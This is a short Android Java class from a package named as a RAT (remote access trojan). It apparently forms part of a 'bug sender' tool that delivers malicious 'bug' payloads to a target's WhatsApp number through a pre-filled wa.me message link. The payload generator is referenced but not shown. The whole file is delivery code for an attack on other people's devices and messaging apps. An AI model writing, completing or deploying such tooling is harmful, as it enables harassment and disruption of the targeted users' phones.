package com.xkiluaa.rat;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;

public class BugSender {

    private final String target;
    private final String bugType;

    public BugSender(String target, String bugType) {
        this.target = target.replace("+", "").replace(" ", "");
        this.bugType = bugType;
    }

    public void send(Context ctx) {
        String payload = PayloadEngine.getPayload(bugType);
        try {
            String url = "https://wa.me/" + target + "?text=" +
                    URLEncoder.encode(payload, "UTF-8");
            Intent i = new Intent(Intent.ACTION_VIEW);
            i.setData(Uri.parse(url));
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
    }
}